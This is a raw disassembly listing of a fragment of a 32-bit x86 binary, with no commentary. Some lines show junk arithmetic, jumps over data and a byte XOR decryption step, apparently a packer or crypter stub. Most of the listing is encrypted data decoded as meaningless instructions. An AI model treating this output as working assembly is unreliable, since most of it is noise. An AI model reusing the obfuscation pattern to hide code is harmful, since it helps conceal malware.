  408380:	adc    DWORD PTR ds:0x4229b2,ebx
  408386:	or     DWORD PTR ds:0x422956,0x2706
  408390:	mov    DWORD PTR ds:0x42293e,0x85d
  40839a:	and    edx,DWORD PTR ds:0x4228ee
  4083a0:	mov    DWORD PTR ds:0x422892,0x217b
  4083aa:	mov    edx,DWORD PTR ds:0x422ae2
  4083b0:	mov    edx,DWORD PTR [edx]
  4083b2:	sub    DWORD PTR ds:0x422956,edx
  4083b8:	add    DWORD PTR ds:0x4228b6,0x6a28
  4083c2:	shr    ecx,0x2
  4083c5:	or     DWORD PTR ds:0x4229c2,0x19bb
  4083cf:	mov    ecx,DWORD PTR [ebp-0x30]
  4083d2:	mov    edx,DWORD PTR [ebp-0x2c]
  4083d5:	xor    eax,edi
  4083d7:	shl    ecx,0x1e
  4083da:	and    ecx,0x262b
  4083e0:	xor    edx,edx
  4083e2:	or     eax,edx
  4083e4:	lea    eax,[ebp+eax*1-0x4]
  4083e8:	sbb    edx,ecx
  4083ea:	mov    DWORD PTR [ebp-0x34],eax
  4083ed:	mov    eax,DWORD PTR [ebp-0x30]
  4083f0:	mov    ecx,DWORD PTR [ebp-0x2c]
  4083f3:	and    DWORD PTR ds:0x4228b2,ebx
  4083f9:	shrd   eax,ecx,0x2
  4083fd:	mov    edx,DWORD PTR ds:0x42292e
  408403:	sub    DWORD PTR ds:0x4228fa,edx
  408409:	shr    ecx,0x2
  40840c:	or     ecx,ecx
  40840e:	jmp    0x408998
  408413:	xchg   edi,eax
  408414:	xchg   dl,bl
  408416:	(bad)  
  408418:	pop    ecx
  408419:	test   BYTE PTR [eax+0x3e],bl
  40841c:	mov    esi,0x828ea8d4
  408421:	pop    es
  408422:	mov    ah,0x4b
  408424:	dec    ebp
  408425:	push   ss
  408426:	push   ss
  408427:	cmp    eax,0xf9161604
  40842c:	add    eax,0x5fcde584
  408431:	sub    BYTE PTR [ebp+esi*4+0x2b],dh
  408435:	cmp    esi,DWORD PTR [eax-0x7b]
  408438:	xor    eax,0x86f934f8
  40843d:	scas   eax,DWORD PTR es:[edi]
  40843e:	in     eax,0x35
  408440:	stos   DWORD PTR es:[edi],eax
  408441:	jne    0x4083d8
  408443:	dec    esi
  408444:	push   0x8202d479
  408449:	mov    al,ds:0xdf8f6a62
  40844e:	jo     0x4084c9
  408450:	sub    eax,0xaf72eb2
  408455:	pop    edx
  408456:	inc    ebx
  408457:	shl    BYTE PTR [edx],1
  408459:	imul   BYTE PTR [edx+0x52]
  40845c:	fisubr DWORD PTR [ebx]
  40845e:	stc    
  40845f:	cmc    
  408460:	ja     0x4083f6
  408462:	push   esp
  408463:	xchg   DWORD PTR [edi-0x60a3052b],edx
  408469:	shl    ebx,cl
  40846b:	or     BYTE PTR [ecx+0x2d],cl
  40846e:	out    0x38,eax
  408470:	retf   
  408471:	jo     0x408486
  408473:	or     al,0x39
  408475:	lea    eax,[ebp-0x7e]
  408478:	and    DWORD PTR [ecx],esp
  40847a:	or     BYTE PTR ds:0x146aefb5,al
  408480:	push   ebx
  408481:	sbb    eax,0x1c03856f
  408486:	ror    DWORD PTR [edi+0x75],1
  408489:	ds retf 0xcc9a
  40848d:	aad    0x9c
  40848f:	stc    
  408490:	xlat   BYTE PTR ds:[ebx]
  408491:	push   es
  408492:	retf   0x7dbd
  408495:	adc    dh,BYTE PTR [eax]
  408497:	out    dx,eax
  408498:	mov    BYTE PTR [ecx],ch
  40849a:	push   ebx
  40849b:	pop    ebp
  40849c:	pop    edx
  40849d:	fldenv [esi]
  40849f:	(bad)  
  4084a1:	xchg   bh,ah
  4084a3:	cmp    BYTE PTR [edi-0x75],cl
  4084a6:	repnz add eax,0x5ee68375
  4084ac:	adc    BYTE PTR [eax-0x3],0x2f
  4084b0:	sub    edx,esi
  4084b2:	outs   dx,BYTE PTR ds:[esi]
  4084b3:	mov    ds:0x3ef563ac,al
  4084b8:	ret    0xb6d0
  4084bb:	mov    edx,0xe21e6ffc
  4084c0:	and    eax,0xc631316a
  4084c5:	sbb    eax,0xc7023a61
  4084ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084cb:	pop    DWORD PTR [edx]
  4084cd:	add    DWORD PTR [esi+ebp*1+0x62],ebx
  4084d1:	in     al,dx
  4084d2:	or     eax,0x771a762b
  4084d7:	test   DWORD PTR [edx],edi
  4084d9:	rcl    BYTE PTR [ebp+0x40],1
  4084dc:	add    DWORD PTR ds:[eax+0x5f],edx
  4084e0:	test   eax,0x4e77433f
  4084e5:	aas    
  4084e6:	pop    esi
  4084e7:	test   BYTE PTR [edx],0x54
  4084ea:	call   0x9a6ae71e
  4084ef:	aas    
  4084f0:	xchg   esp,eax
  4084f1:	and    esi,edi
  4084f3:	jmp    0x408555
  4084f5:	in     eax,dx
  4084f6:	sbb    dl,0x13
  4084f9:	add    eax,0xdda42bdc
  4084fe:	dec    esi
  4084ff:	adc    eax,0x2e7a9dad
  408504:	std    
  408505:	lahf   
  408506:	pop    ds
  408507:	pop    ebp
  408508:	push   esp
  408509:	mov    dl,0xeb
  40850b:	je     0x408524
  40850d:	mov    al,ds:0xbbd1cdaa
  408512:	lea    ebx,[edi+eax*4+0x18524658]
  408519:	jecxz  0x40850e
  40851b:	push   ebp
  40851c:	out    0xea,eax
  40851e:	and    bh,dh
  408520:	or     dl,BYTE PTR [edi]
  408522:	sbb    eax,0xda62d9e5
  408527:	jnp    0x40853b
  408529:	push   ss
  40852a:	mov    ch,0x9c
  40852c:	cld    
  40852d:	mov    al,ch
  40852f:	aad    0x41
  408531:	(bad)  
  408532:	push   esi
  408533:	and    dl,ah
  408535:	mov    esp,0x30854e73
  40853a:	mov    al,ds:0x76d3f0bc
  40853f:	pop    esi
  408540:	outs   dx,DWORD PTR ds:[esi]
  408541:	inc    edx
  408542:	or     BYTE PTR [edx-0x8560a5b],0x6b
  408549:	sbb    DWORD PTR [ecx+0x632c3dcb],edx
  40854f:	popa   
  408550:	cs pop edx
  408552:	and    edi,ebp
  408554:	xchg   ebx,eax
  408555:	dec    esi
  408556:	repnz iret 
  408558:	cmp    DWORD PTR ds:0x71c844c,ebp
  40855e:	mov    ebx,0xc66c2cbe
  408563:	iret   
  408564:	outs   dx,BYTE PTR ss:[esi]
  408566:	scas   eax,DWORD PTR es:[edi]
  408567:	pop    ss
  408568:	repnz in al,dx
  40856a:	jbe    0x40856d
  40856c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40856d:	pushf  
  40856e:	adc    ebp,ebx
  408570:	and    ecx,DWORD PTR [esi-0x3c365f7]
  408576:	xor    BYTE PTR [edi+0x44],bl
  408579:	sbb    BYTE PTR [edx-0x3049fc4f],0xf1
  408580:	in     eax,0xcb
  408582:	sbb    DWORD PTR [ebp-0x73],ecx
  408585:	dec    bl
  408587:	out    0x10,al
  408589:	hlt    
  40858a:	or     edx,DWORD PTR [ebp+0x44]
  40858d:	inc    ebp
  40858e:	xchg   ecx,eax
  40858f:	pop    es
  408590:	fnstsw WORD PTR [edx-0x7f]
  408593:	or     al,BYTE PTR [edi+0x1499f6d7]
  408599:	retf   
  40859a:	mov    esp,DWORD PTR ds:0x5aed29cf
  4085a0:	lods   al,BYTE PTR ds:[esi]
  4085a1:	adc    al,0x45
  4085a3:	mov    dh,0xa4
  4085a5:	daa    
  4085a6:	add    eax,0xf6ec7085
  4085ab:	or     bh,BYTE PTR [edi-0x434ae00f]
  4085b1:	idiv   DWORD PTR [edi+ebp*8+0x23]
  4085b5:	lds    ebp,FWORD PTR [eax]
  4085b7:	xchg   BYTE PTR [ebx-0x35],bh
  4085ba:	push   esp
  4085bb:	hlt    
  4085bc:	iret   
  4085bd:	mov    ah,0x2e
  4085bf:	jl     0x408562
  4085c1:	imul   edx,DWORD PTR fs:[eax-0xe00059c],0xffffffe1
  4085c9:	ss mov edx,0x3986432c
  4085cf:	popa   
  4085d0:	fist   DWORD PTR [ebx]
  4085d2:	je     0x4085da
  4085d4:	xchg   edx,eax
  4085d5:	jge    0x408606
  4085d7:	cmp    esi,DWORD PTR [eax-0x6a4693f3]
  4085dd:	inc    ecx
  4085de:	and    edi,DWORD PTR [eax-0x55]
  4085e1:	es sbb dh,dh
  4085e4:	mov    edi,DWORD PTR [esi-0x718d26ef]
  4085ea:	pop    es
  4085eb:	mov    eax,0xc9ea78
  4085f0:	inc    esp
  4085f1:	xchg   edx,eax
  4085f2:	mov    DWORD PTR [edx+0x1f],esi
  4085f5:	dec    edi
  4085f6:	push   esp
  4085f7:	jp     0x4085ed
  4085f9:	pop    ds
  4085fa:	jb     0x4085bc
  4085fc:	scas   eax,DWORD PTR es:[edi]
  4085fd:	adc    al,0x5d
  4085ff:	sbb    BYTE PTR [esi],ch
  408601:	jns    0x408654
  408603:	push   cs
  408604:	loope  0x408677
  408606:	stos   BYTE PTR es:[edi],al
  408607:	sbb    esi,eax
  408609:	bound  edx,QWORD PTR [ebx+edx*1+0xb76968d]
  408610:	xchg   esp,eax
  408611:	sub    eax,0xdf54c6fa
  408616:	rcl    DWORD PTR [edx+0x13],0x94
  40861a:	lods   eax,DWORD PTR ds:[esi]
  40861b:	aas    
  40861c:	cdq    
  40861d:	test   BYTE PTR [ecx],0xfe
  408620:	push   ebx
  408621:	mov    WORD PTR [edi+ebx*1+0x73],ds
  408625:	les    ebp,FWORD PTR [edi-0x52]
  408628:	add    edi,ebx
  40862a:	add    al,0x1b
  40862c:	ja     0x4085ea
  40862e:	pop    ebp
  40862f:	adc    DWORD PTR [esp+eax*2+0x5882847a],0x68
  408637:	xchg   DWORD PTR gs:[edi+0x597cab38],ebx
  40863e:	ins    BYTE PTR es:[edi],dx
  40863f:	adc    eax,0xb14f07d3
  408644:	push   esi
  408645:	cmp    eax,0x1d767ee4
  40864a:	stos   DWORD PTR es:[edi],eax
  40864b:	pop    esp
  40864c:	mov    eax,ds:0x3235630a
  408651:	mov    esp,0xe2540e6
  408656:	into   
  408657:	fnstsw WORD PTR [esi]
  408659:	adc    BYTE PTR [esp+edx*2-0x45],cl
  40865d:	fs outs dx,BYTE PTR es:[esi]
  408660:	sbb    al,0x1
  408662:	push   ds
  408663:	jns    0x40867d
  408665:	sbb    al,0xba
  408667:	dec    eax
  408668:	retf   0x79e6
  40866b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40866c:	inc    edi
  40866d:	pop    ebp
  40866e:	mov    ebx,?
  408670:	inc    ebx
  408671:	retf   0x5632
  408674:	adc    DWORD PTR [edi-0x68],eax
  408677:	sub    DWORD PTR [ecx+0x5cf78c1e],eax
  40867d:	dec    eax
  40867e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40867f:	je     0x40869b
  408681:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408682:	xchg   ebp,eax
  408683:	int    0xfd
  408685:	in     eax,dx
  408686:	adc    al,0xf9
  408688:	mov    al,0xb5
  40868a:	sub    BYTE PTR [edi],al
  40868c:	mov    WORD PTR [esi-0x6f23934e],ss
  408692:	je     0x4086a5
  408694:	ror    BYTE PTR [edx+0x60377c51],1
  40869a:	mov    bh,0x58
  40869c:	dec    ebp
  40869d:	mov    ebx,0x3c74131d
  4086a2:	xchg   ebp,eax
  4086a3:	(bad)  
  4086a4:	pop    esi
  4086a5:	(bad)  
  4086a8:	jbe    0x4086f8
  4086aa:	jnp    0x4086d1
  4086ac:	jns    0x408666
  4086ae:	and    ecx,DWORD PTR [ebx+0x42]
  4086b1:	dec    ecx
  4086b2:	fucomi st,st(2)
  4086b4:	hlt    
  4086b5:	jge    0x4086cf
  4086b7:	in     al,0x16
  4086b9:	ret    
  4086ba:	test   al,0x5d
  4086bc:	pop    ss
  4086bd:	in     eax,dx
  4086be:	in     eax,0x36
  4086c0:	inc    ecx
  4086c1:	mov    bl,0xa1
  4086c3:	xlat   BYTE PTR ds:[ebx]
  4086c4:	dec    esp
  4086c5:	push   esp
  4086c6:	rcr    BYTE PTR [ecx-0x1c66f5ec],0x28
  4086cd:	lock and DWORD PTR [eax],esp
  4086d0:	xor    edi,DWORD PTR [esi]
  4086d2:	js     0x40865a
  4086d4:	cmp    eax,DWORD PTR [ecx]
  4086d6:	popf   
  4086d7:	push   cs
  4086d8:	adc    ebp,esi
  4086da:	out    0x43,eax
  4086dc:	mov    ah,0x6a
  4086de:	mov    ch,0x66
  4086e0:	ss pop ebp
  4086e2:	inc    edx
  4086e3:	(bad)  
  4086e4:	bound  ecx,QWORD PTR [esi-0x19]
  4086e7:	shr    DWORD PTR [eax+0x75693a5b],0x68
  4086ee:	add    al,0x7d
  4086f0:	sub    eax,0x40ba6057
  4086f5:	stos   BYTE PTR es:[edi],al
  4086f6:	sbb    BYTE PTR [edx],al
  4086f8:	aad    0x90
  4086fa:	into   
  4086fb:	(bad)  
  4086fc:	mov    ds:0xc88dc13e,eax
  408701:	pop    ss
  408702:	in     al,dx
  408703:	adc    esi,DWORD PTR [eax]
  408705:	fsub   DWORD PTR [esp+eax*8]
  408708:	and    ecx,DWORD PTR [edi]
  40870a:	stos   DWORD PTR es:[edi],eax
  40870b:	mov    esi,0x4f844228
  408710:	loop   0x4086bc
  408712:	int    0xd7
  408714:	out    dx,eax
  408715:	mov    BYTE PTR [ebx-0x13],ah
  408718:	ja     0x408779
  40871a:	or     bh,bh
  40871c:	mov    WORD PTR [ecx+0x3a179688],fs
  408722:	or     ebx,ecx
  408724:	xchg   ebp,eax
  408725:	jp     0x4086f3
  408727:	adc    BYTE PTR [edx+eiz*4],dh
  40872a:	xchg   edi,eax
  40872b:	jne    0x40877e
  40872d:	or     al,0x61
  40872f:	sub    DWORD PTR [edx+0x5aadf282],ebp
  408735:	scas   eax,DWORD PTR es:[edi]
  408736:	cmp    BYTE PTR [edx],dl
  408738:	lock outs dx,BYTE PTR ds:[esi]
  40873a:	pushf  
  40873b:	pop    eax
  40873c:	sahf   
  40873d:	push   ebp
  40873e:	stc    
  40873f:	xor    eax,0x41963144
  408744:	je     0x40876f
  408746:	ret    0x91b1
  408749:	je     0x4086fd
  40874b:	sub    eax,0xc9c37f76
  408750:	fcmovnbe st,st(7)
  408752:	retf   
  408753:	mov    ebx,0x15e9c06a
  408758:	(bad)  
  408759:	daa    
  40875a:	std    
  40875b:	sbb    al,0x21
  40875d:	or     DWORD PTR [edi],ebp
  40875f:	sahf   
  408760:	in     eax,0x15
  408762:	lea    ebp,[ecx-0x74315833]
  408768:	test   al,0xd4
  40876a:	mov    al,ds:0x49b5b95
  40876f:	or     eax,0xb3e543f5
  408774:	jnp    0x408703
  408776:	pop    edi
  408777:	ret    0x2d35
  40877a:	mul    bh
  40877c:	mov    ch,0x94
  40877e:	pop    eax
  40877f:	inc    ebx
  408780:	add    dh,ch
  408782:	out    0xf2,al
  408784:	and    ebx,DWORD PTR [eax-0x5a]
  408787:	(bad)  
  408789:	xchg   ebp,eax
  40878a:	leave  
  40878b:	retf   
  40878c:	mov    ebp,0xb5e1b0c6
  408791:	dec    eax
  408792:	xchg   edi,eax
  408793:	jmp    0xd7bc8fb3
  408798:	sahf   
  408799:	jge    0x408757
  40879b:	out    dx,al
  40879c:	xchg   edx,eax
  40879d:	fwait
  40879e:	mov    fs,WORD PTR [edx-0x588736e4]
  4087a4:	out    dx,al
  4087a5:	(bad)  
  4087a6:	in     eax,dx
  4087a7:	sbb    ecx,DWORD PTR ds:[eax]
  4087aa:	cmp    ebp,DWORD PTR [edi+0x40ed853d]
  4087b0:	push   edx
  4087b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4087b2:	bound  eax,QWORD PTR [edi+0x6fb7c1c4]
  4087b8:	mov    ds:0x1b35491d,eax
  4087bd:	pushf  
  4087be:	nop
  4087bf:	in     eax,0x4d
  4087c1:	sar    BYTE PTR [esi-0x661b5390],0x35
  4087c8:	std    
  4087c9:	je     0x408751
  4087cb:	mov    ecx,0xbbc29bef
  4087d0:	jmp    0x693f:0xd1173a44
  4087d7:	fisubr WORD PTR [eax+eax*2+0x66]
  4087db:	xor    eax,0x3a99742b
  4087e0:	fistp  WORD PTR [esi]
  4087e2:	or     eax,0x39d39634
  4087e7:	mov    WORD PTR ds:0x826921b,?
  4087ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4087ee:	cwde   
  4087ef:	iret   
  4087f0:	mov    esp,0xb5984d95
  4087f5:	jbe    0x408840
  4087f7:	retf   0xccf3
  4087fa:	jne    0x4087a4
  4087fc:	sub    DWORD PTR [edi],ebx
  4087fe:	imul   esi,DWORD PTR [ecx+0x2c],0xffffff99
  408802:	neg    esi
  408804:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408805:	jl     0x408859
  408807:	sub    bl,BYTE PTR cs:[esi]
  40880a:	imul   ebp,ebp,0xffffffcd
  40880d:	imul   esp,ebp,0x72
  408810:	push   cs
  408811:	outs   dx,BYTE PTR ds:[esi]
  408812:	repz xor BYTE PTR [ecx-0x56c0a8e2],bl
  408819:	add    DWORD PTR ds:0xacac51a7,ecx
  40881f:	(bad)  
  408821:	clc    
  408822:	fnstenv [eax-0x43be1ed1]
  408828:	mov    cl,0x61
  40882a:	das    
  40882b:	fdivr  QWORD PTR [eax-0x53472fc1]
  408831:	xor    DWORD PTR [eax],0xffffffd9
  408834:	into   
  408835:	rcr    BYTE PTR [edi],cl
  408837:	and    al,0x71
  408839:	cmp    bh,BYTE PTR [eax+0x1c]
  40883c:	dec    edx
  40883d:	(bad)  
  40883e:	pusha  
  40883f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408840:	aam    0x92
  408842:	retf   
  408843:	mov    cl,0xe9
  408845:	pop    esp
  408846:	sub    eax,0x40b26d74
  40884b:	aas    
  40884c:	imul   BYTE PTR [edx+0x18e987a]
  408852:	les    ecx,FWORD PTR [eax+0x36ec0872]
  408858:	aam    0x5e
  40885a:	gs mov dh,0x25
  40885d:	(bad)  
  40885f:	mov    eax,0x7bf4e2c3
  408864:	pop    esi
  408865:	push   eax
  408866:	pop    edx
  408867:	jno    0x4088c5
  408869:	and    ebx,DWORD PTR [ebp+0x2a494192]
  40886f:	xor    ecx,DWORD PTR [ebx]
  408871:	push   ebp
  408872:	lock adc esp,ecx
  408875:	ss sbb eax,0x7889b405
  40887b:	mov    eax,0x5f08e0c3
  408880:	(bad)  
  408881:	lods   eax,DWORD PTR ds:[esi]
  408882:	loopne 0x408817
  408884:	aaa    
  408885:	adc    al,0xd0
  408887:	pop    ds
  408888:	and    al,0x48
  40888a:	jb     0x40889f
  40888c:	jle    0x4088d5
  40888e:	inc    esp
  40888f:	data16 jl 0x4088fd
  408892:	sub    BYTE PTR [ebx-0x8],al
  408895:	adc    ecx,ebp
  408897:	je     0x40889a
  408899:	mov    ch,0xaf
  40889b:	(bad)  
  40889c:	and    DWORD PTR [edx],ebp
  40889e:	mov    dl,0x75
  4088a0:	in     al,0x73
  4088a2:	loope  0x4088e1
  4088a4:	loop   0x40884c
  4088a6:	int    0xc2
  4088a8:	test   DWORD PTR [ebx],0x4fe4a618
  4088ae:	popa   
  4088af:	fs dec edx
  4088b1:	in     al,0xe0
  4088b3:	push   cs
  4088b4:	mov    esp,0xed2163d2
  4088b9:	in     eax,dx
  4088ba:	pop    ebp
  4088bb:	push   eax
  4088bc:	and    DWORD PTR [ecx],ebp
  4088be:	pusha  
  4088bf:	xchg   ebp,eax
  4088c0:	pusha  
  4088c1:	fwait
  4088c2:	and    eax,0x8a79c9eb
  4088c7:	daa    
  4088c8:	test   eax,0x6754df49
  4088cd:	sbb    cl,dh
  4088cf:	push   edi
  4088d0:	ret    
  4088d1:	ret    0x1794
  4088d4:	cwde   
  4088d5:	jnp    0x4088c3
  4088d7:	popa   
  4088d8:	or     ah,BYTE PTR [eax+eax*1]
  4088db:	xor    eax,0xad3ead77
  4088e0:	mov    edi,0x98fe39b9
  4088e5:	inc    ecx
  4088e6:	inc    ebp
  4088e7:	jle    0x408932
  4088e9:	sub    BYTE PTR [di+0x4e],ah
  4088ed:	mov    DWORD PTR [edx],ebp
  4088ef:	and    dh,BYTE PTR [ebx+0x3ec28344]
  4088f5:	mov    DWORD PTR [esi+ebx*8+0x1fc65c63],esp
  4088fc:	push   ebx
  4088fd:	(bad)  
  4088fe:	ins    BYTE PTR es:[edi],dx
  4088ff:	and    BYTE PTR ds:0x2feada12,0xa1
  408906:	mov    bl,0x43
  408908:	popf   
  408909:	add    DWORD PTR [ebp-0x1d9a2f9b],ebx
  40890f:	mov    ebp,0x1e93b849
  408914:	or     eax,0x2560b5a4
  408919:	pusha  
  40891a:	and    cl,BYTE PTR [ebx+0x5dba405e]
  408920:	jo     0x4088e5
  408922:	and    bl,BYTE PTR [edx-0x17d33f2a]
  408928:	ja     0x408998
  40892a:	bound  edx,QWORD PTR [eax]
  40892c:	mov    bh,0xc1
  40892e:	sub    esi,DWORD PTR [ebx+0x78]
  408931:	jp     0x4088d9
  408933:	or     al,0x46
  408935:	mov    WORD PTR [esi-0x7dd8298a],ds
  40893b:	int    0x4f
  40893d:	scas   eax,DWORD PTR es:[edi]
  40893e:	inc    edx
  40893f:	jns    0x408910
  408941:	xchg   DWORD PTR [edx+0x3525f3d3],edi
  408947:	cwde   
  408948:	dec    ebx
  408949:	stos   DWORD PTR es:[edi],eax
  40894a:	ins    DWORD PTR es:[edi],dx
  40894b:	push   ebx
  40894c:	cmp    ecx,DWORD PTR [edx+ebp*1]
  40894f:	vminpd ymm2,ymm3,YMMWORD PTR [ebp-0x6d591713]
  408957:	lahf   
  408958:	test   BYTE PTR [esp+edi*1+0x6f146185],dh
  40895f:	xor    al,0x2f
  408961:	out    dx,eax
  408962:	push   ds
  408963:	repz or eax,0x257ed294
  408969:	ja     0x4089e2
  40896b:	sub    DWORD PTR [ebp-0x7a],eax
  40896e:	dec    ebx
  40896f:	or     eax,0x68c4d456
  408974:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408975:	or     bh,BYTE PTR ds:0x698f5bb7
  40897b:	mov    eax,ds:0x5ba8cc3a
  408980:	mul    BYTE PTR [edi]
  408982:	fiadd  DWORD PTR [ecx+0x3b]
  408985:	push   eax
  408986:	test   eax,0xedf15b49
  40898b:	mov    DWORD PTR [ebx],ecx
  40898d:	lea    ebx,[esi-0x49409f36]
  408993:	pop    eax
  408994:	mov    edi,0x8bafc4d4
  408999:	dec    ebp
  40899a:	ror    BYTE PTR [ebx+0x1581d455],1
  4089a0:	dec    edx
  4089a1:	sub    DWORD PTR [edx+0x0],eax
  4089a4:	call   FWORD PTR [edi]
  4089a6:	add    BYTE PTR [eax],al
  4089a8:	shl    ecx,0x1e
  4089ab:	mov    ecx,DWORD PTR [ebp-0x14]
  4089ae:	xor    eax,edi
  4089b0:	xor    edx,edx
  4089b2:	sbb    DWORD PTR ds:0x4228c2,0x5606
  4089bc:	or     eax,edx
  4089be:	mov    cl,BYTE PTR [eax+ecx*1]
  4089c1:	mov    eax,DWORD PTR [ebp-0x34]
  4089c4:	or     edx,DWORD PTR ds:0x42290e
  4089ca:	xor    BYTE PTR [eax],cl
  4089cc:	mov    eax,DWORD PTR [ebp-0x20]
  4089cf:	sub    DWORD PTR ds:0x422932,0x6c12
  4089d9:	jmp    0x408f63
  4089de:	in     eax,dx
  4089df:	imul   ebx,eax,0x7d
  4089e2:	pop    eax
  4089e3:	je     0x408a4d
  4089e5:	pop    edx
  4089e6:	mov    ds:0x3072b232,eax
  4089eb:	push   ds
  4089ec:	dec    esp
  4089ed:	je     0x40896f
  4089ef:	inc    ebx
  4089f0:	push   ss
  4089f1:	push   ss
  4089f2:	cmp    eax,0x6b161604
  4089f7:	xor    eax,0xdd40ef4d
  4089fc:	mov    bl,0xb9
  4089fe:	fiadd  WORD PTR [ecx-0x7]
  408a01:	inc    ebx
  408a02:	out    dx,al
  408a03:	mov    ds:0x761cb784,al
  408a08:	adc    ebp,DWORD PTR [ebx]
  408a0a:	les    ecx,FWORD PTR es:[ecx]
  408a0d:	rcl    DWORD PTR fs:[bx+di],0x12
  408a12:	rcr    DWORD PTR [edi],1
  408a14:	mov    ebx,0xd8024d8b
  408a19:	test   DWORD PTR [edi-0x557fa7aa],0x34eedb26
  408a23:	dec    ecx
  408a24:	bswap  edx
  408a26:	xchg   ecx,eax
  408a27:	mov    cl,0x3d
  408a29:	pop    eax
  408a2a:	push   0x12
  408a2c:	sti    
  408a2d:	jae    0x4089d8
  408a2f:	sbb    eax,0x653f0a4e
  408a34:	ss add eax,0x8ee765e6
  408a3a:	push   ecx
  408a3b:	inc    ecx
  408a3c:	inc    edi
  408a3d:	mov    ecx,0x666db3a8
  408a42:	cmp    al,0xdb
  408a44:	icebp  
  408a45:	mov    ecx,0x6c222384
  408a4a:	test   BYTE PTR [edi+esi*4+0x25bee574],bh
  408a51:	lea    ebx,[edx+0x35]
  408a54:	mov    ds:0xae11c01,eax
  408a59:	(bad)  
  408a5a:	not    BYTE PTR [esi+0x47]
  408a5d:	sbb    eax,0xb4dbce73
  408a62:	fwait
  408a63:	gs push 0xfffffff6
  408a66:	add    cl,BYTE PTR [ecx]
  408a68:	call   0xd6edde3d
  408a6d:	and    esi,DWORD PTR [edx+0x63]
  408a70:	lods   eax,DWORD PTR ds:[esi]
  408a71:	xchg   edx,eax
  408a72:	ror    BYTE PTR [ecx-0x64],cl
  408a75:	add    eax,0x768c7374
  408a7a:	test   DWORD PTR [edx-0x33],edi
  408a7d:	jle    0x408aeb
  408a7f:	lea    edx,[edx+0x67]
  408a82:	mov    bl,0x7a
  408a84:	push   es
  408a85:	stos   DWORD PTR es:[edi],eax
  408a86:	or     al,0xdd
  408a88:	stos   BYTE PTR es:[edi],al
  408a89:	lea    esp,[eax]
  408a8b:	clc    
  408a8c:	xchg   ecx,eax
  408a8d:	cs cwde 
  408a8f:	jo     0x408afa
  408a91:	cmp    ebx,DWORD PTR [ecx]
  408a93:	jns    0x408a30
  408a95:	push   0x595d9916
  408a9a:	jle    0x408b1b
  408a9c:	fisubr DWORD PTR [edx+0x6e6b11f4]
  408aa2:	or     eax,0x883cbe80
  408aa7:	jp     0x408acd
  408aa9:	adc    DWORD PTR fs:[ebx],edi
  408aac:	cld    
  408aad:	fst    DWORD PTR [eax-0x39]
  408ab0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ab1:	xor    BYTE PTR [esp+eiz*4+0x490ce2cd],bl
  408ab8:	outs   dx,DWORD PTR ds:[esi]
  408ab9:	test   DWORD PTR [ebx],0xb59632c7
  408abf:	fisttp DWORD PTR [ebp-0x67]
  408ac2:	test   BYTE PTR [edi],0x45
  408ac5:	mov    ds:0x1e92230a,eax
  408aca:	push   edi
  408acb:	(bad)  
  408acc:	jo     0x408b4a
  408ace:	mov    ds:0xe9c3ca79,al
  408ad3:	inc    esp
  408ad4:	aad    0x53
  408ad6:	scas   al,BYTE PTR es:[edi]
  408ad7:	add    eax,0xa8e3ee4b
  408adc:	jp     0x408b15
  408ade:	jmp    0xbb55:0x133b7327
  408ae5:	sub    dh,BYTE PTR [edx]
  408ae7:	sub    BYTE PTR [esp+eiz*2],bl
  408aea:	fisttp WORD PTR [ebx+0x65]
  408aed:	scas   eax,DWORD PTR es:[edi]
  408aee:	neg    BYTE PTR [ebp-0x44]
  408af1:	adc    ecx,DWORD PTR [edx-0x61]
  408af4:	xor    eax,0x30b7cccf
  408af9:	imul   ebp,DWORD PTR [edi],0xc6baf6fd
  408aff:	out    0x4a,eax
  408b01:	mov    ecx,0x9953ca32
  408b06:	pop    ebx
  408b07:	(bad)
  408b0c:	aaa    
  408b0d:	bsf    ecx,DWORD PTR [edx]
  408b10:	adc    al,0x6f
  408b12:	pushf  
  408b13:	into   
  408b14:	jnp    0x408af5
  408b16:	lods   eax,DWORD PTR ds:[esi]
  408b17:	test   eax,0x2999fcec
  408b1c:	inc    edi
  408b1d:	cmp    al,0x9c
  408b1f:	imul   esp,edx,0x49
  408b22:	xchg   DWORD PTR [edi],ecx
  408b24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b25:	add    al,0xbe
  408b27:	and    esp,DWORD PTR [eax-0x67]
  408b2a:	sub    al,0xef
  408b2c:	adc    ah,BYTE PTR [edi+0x32ed8d2]
  408b32:	outs   dx,BYTE PTR ds:[esi]
  408b33:	arpl   WORD PTR [edx+0x4c666b2d],di
  408b39:	sbb    ah,BYTE PTR [eax]
  408b3b:	test   al,dl
  408b3d:	in     eax,0xb0
  408b3f:	arpl   WORD PTR [edi+esi*4+0x20],di
  408b43:	xchg   edi,eax
  408b44:	fbstp  TBYTE PTR [edx-0x5d]
  408b47:	xchg   DWORD PTR ss:[ecx+0x61d05bcf],edi
  408b4e:	(bad)  
  408b4f:	enter  0x20b,0x6f
  408b53:	fsubr  st,st(3)
  408b55:	ins    DWORD PTR es:[edi],dx
  408b56:	in     eax,0xde
  408b58:	pop    ecx
  408b59:	mov    ecx,gs
  408b5b:	xor    DWORD PTR [edx],edi
  408b5d:	jns    0x408b27
  408b5f:	into   
  408b60:	sbb    dl,BYTE PTR [eax]
  408b62:	add    ebp,DWORD PTR [ebp-0x24]
  408b65:	xchg   BYTE PTR [esi],al
  408b67:	outs   dx,BYTE PTR ds:[esi]
  408b68:	adc    eax,DWORD PTR [ebx]
  408b6a:	mov    ebp,0x47ebdc41
  408b6f:	inc    ecx
  408b70:	push   esp
  408b71:	mov    ch,0xc9
  408b73:	and    cl,BYTE PTR [edi-0x6c]
  408b76:	and    dh,BYTE PTR [ebx+0x54edc324]
  408b7c:	inc    edx
  408b7d:	mov    ds:0x3b392a53,al
  408b82:	pusha  
  408b83:	jbe    0x408b2b
  408b85:	int3   
  408b86:	and    esi,edx
  408b88:	push   0x13dcc9ee
